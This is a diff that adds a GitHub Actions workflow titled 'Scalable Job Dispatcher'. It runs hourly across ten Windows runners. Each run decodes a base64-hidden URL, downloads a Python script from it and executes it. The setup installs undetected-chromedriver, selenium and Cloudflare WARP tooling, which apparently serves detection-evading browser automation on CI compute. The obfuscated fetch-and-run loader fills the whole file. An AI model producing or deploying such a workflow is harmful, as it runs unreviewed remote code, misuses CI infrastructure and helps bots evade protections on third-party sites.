@@ -1,0 +1,70 @@
+name: Scalable Job Dispatcher
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '0 * * * *'
+
+concurrency:
+  group: pipeline-queue-${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: false
+
+jobs:
+  run-agents:
+    name: "Worker-${{ matrix.node_id }}"
+    runs-on: windows-2022
+    timeout-minutes: 75
+
+    strategy:
+      fail-fast: false
+      matrix:
+        node_id: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]
+
+    steps:
+      - name: Environment Setup & Script Fetch
+        shell: bash
+        run: |
+          echo "[LOG] Initializing Worker-${{ matrix.node_id }}..."
+          
+          # فك تشفير الرابط المصدر وتحميل ملف التشغيل
+          PAYLOAD_ENDPOINT=$(echo "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9zYW1pbG9kOS92YXovcmVzb2x2ZS9tYWluL3N0YXJ0X3Nocmlua19uZXcucHk=" | base64 --decode)
+          
+          curl -sL "$PAYLOAD_ENDPOINT" -o task_launcher.py
+          
+          echo "[LOG] Preparing Python packages..."
+          python -m pip install -qU pip setuptools
+          pip install -q undetected-chromedriver selenium requests
+          echo "[LOG] Environment initialization finished."
+
+      - name: Launch Task & Enforce Timeout
+        shell: pwsh
+        env:
+          PYTHONIOENCODING: "utf-8"
+        run: |
+          Write-Host "[EXEC] Starting Python script on node ${{ matrix.node_id }}..."
+          
+          $env:PATH = "$env:PATH;C:\Program Files\Cloudflare\Cloudflare WARP"
+          
+          $ProcessArguments = @{
+              FilePath     = "python"
+              ArgumentList = "task_launcher.py"
+              PassThru     = $true
+              NoNewWindow  = $true
+          }
+          $SubProcess = Start-Process @ProcessArguments
+          
+          Write-Host "[EXEC] Process watchdog started. Max threshold: 74 mins."
+          
+          try {
+              Wait-Process -InputObject $SubProcess -Timeout 4440 -ErrorAction Stop
+              Write-Host "[EXEC] Process completed within expected timeframe."
+          }
+          catch {
+              Write-Host "[WARN] Time threshold reached. Terminating background job..."
+              Stop-Process -InputObject $SubProcess -Force
+              Write-Host "[EXEC] Process killed successfully."
+          }
+
+      - name: Wrap Up Execution
+        shell: bash
+        run: echo "[COMPLETE] Worker-${{ matrix.node_id }} job finished."
